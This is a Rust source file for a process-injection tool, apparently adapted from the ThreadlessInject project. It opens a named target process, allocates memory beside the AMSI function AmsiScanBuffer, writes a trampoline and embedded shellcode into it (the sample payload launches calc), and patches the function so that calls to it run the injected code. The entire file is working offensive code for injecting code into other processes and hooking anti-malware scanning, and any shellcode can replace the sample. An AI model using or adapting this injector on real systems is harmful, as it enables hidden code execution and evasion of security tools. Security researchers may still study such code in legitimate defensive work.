#![allow(static_mut_refs)]

use std::ffi::c_void;
use sysinfo::System;
use windows::{
    core::s,
    Win32::{
        Foundation::HANDLE,
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            LibraryLoader::{GetProcAddress, LoadLibraryA},
            Memory::{
                VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
                PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
            },
            Threading::{OpenProcess, PROCESS_ALL_ACCESS},
        },
    },
};

// https://github.com/CCob/ThreadlessInject/blob/master/ThreadlessInject/Program.cs#L31
static mut PATCH_SHELLCODE: [u8; 55] = [
    0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,
    0x48, 0xB9, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC,
    0x40, 0xE8, 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59,
    0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF, 0xE0,
];

// https://github.com/CCob/ThreadlessInject/blob/master/ThreadlessInject/Program.cs#L17
const SHELLCODE: [u8; 106] = [
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A, 0x60, 0x5A, 0x68, 0x63,
    0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18,
    0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F,
    0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF,
    0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3,
];

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = std::env::args().collect::<Vec<String>>();
    let process_name = &args[1];
    let pid = find_process(process_name)?;

    unsafe {
        let h_module = LoadLibraryA(s!("amsi.dll"))?;
        let address = GetProcAddress(h_module, s!("AmsiScanBuffer"));
        let func_address = std::mem::transmute(address);
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid)?;
        
        println!("[+] Function: AmsiScanBuffer | Address: {:?}", func_address);
    
        println!("[+] Patching the trampoline");
        let original_bytes = *(func_address as *const u64);
        PATCH_SHELLCODE[18..26].copy_from_slice(&original_bytes.to_ne_bytes());
    
        println!("[+] Looking for a memory hole");
        let address_role = find_memory_role(func_address as usize, h_process)?;
        
        println!("[+] Writing the shellcode");
        write_shellcode(h_process, address_role);
    
        println!("[+] Installing the trampoline");
        install_trampoline(h_process, address_role, func_address);
    
        println!("[+] Finish :)");
    }

    Ok(())
}

fn find_memory_role(func_address: usize, h_process: HANDLE) -> Result<*mut c_void, &'static str> {
    let mut address = (func_address & 0xFFFFFFFFFFF70000) - 0x70000000;
    while address < func_address + 0x70000000 {
        let tmp_address = unsafe {
            VirtualAllocEx(
                h_process,
                Some(address as *mut c_void),
                SHELLCODE.len() + PATCH_SHELLCODE.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };

        if !tmp_address.is_null() {
            println!("[+] Allocated at: {:?}", tmp_address);
            return Ok(tmp_address);
        }

        address += 0x10000;
    }

    Err("Memory Role Not Found")
}

fn install_trampoline(h_process: HANDLE, address: *mut c_void, function_address: *mut c_void) {
    let mut trampoline = [0xE8, 0x00, 0x00, 0x00, 0x00];
    let rva = (address as usize).wrapping_sub(function_address as usize + trampoline.len());
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    let mut number_bytes_written = 0;

    let rva_bytes = rva.to_ne_bytes();
    trampoline[1..].copy_from_slice(&rva_bytes[..4]);

    unsafe {
        VirtualProtectEx(
            h_process,
            function_address,
            trampoline.len(),
            PAGE_READWRITE,
            &mut old_protect,
        ).expect("[!] VirtualProtectEx Failed With Status");

        WriteProcessMemory(
            h_process,
            function_address,
            trampoline.as_ptr().cast(),
            trampoline.len(),
            Some(&mut number_bytes_written),
        ).expect("[!] WriteProcessMemory Failed With Status");

        VirtualProtectEx(
            h_process,
            function_address,
            trampoline.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ).expect("[!] VirtualProtectEx (2) Failed With Status");
    };
}

fn write_shellcode(h_process: HANDLE, address: *mut c_void) {
    unsafe {
        let mut number_of_write = 0;
        WriteProcessMemory(
            h_process, 
            address, 
            PATCH_SHELLCODE.as_ptr().cast(), 
            PATCH_SHELLCODE.len(), 
            Some(&mut number_of_write)
        ).expect("[!] WriteProcessMemory Failed With Status");
        
        let shellcode_address = address as usize + PATCH_SHELLCODE.len();
        WriteProcessMemory( 
            h_process, 
            shellcode_address as *mut c_void, 
            SHELLCODE.as_ptr().cast(), 
            SHELLCODE.len(), 
            Some(&mut number_of_write)
        ).expect("[!] WriteProcessMemory (2) Failed With Status");

        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            h_process, 
            address, 
            SHELLCODE.len(), 
            PAGE_EXECUTE_READWRITE, 
            &mut old_protect
        ).expect("[!] VirtualProtectEx (3) Failed With Status");
    }   
}

fn find_process(process_name: &str) -> Result<u32, &'static str> {
    let mut system = System::new_all();
    system.refresh_all();

    for (pid, process) in system.processes() {
        if process.name() == process_name {
            return Ok(pid.as_u32());
        }
    }

    Err("Process not found")
}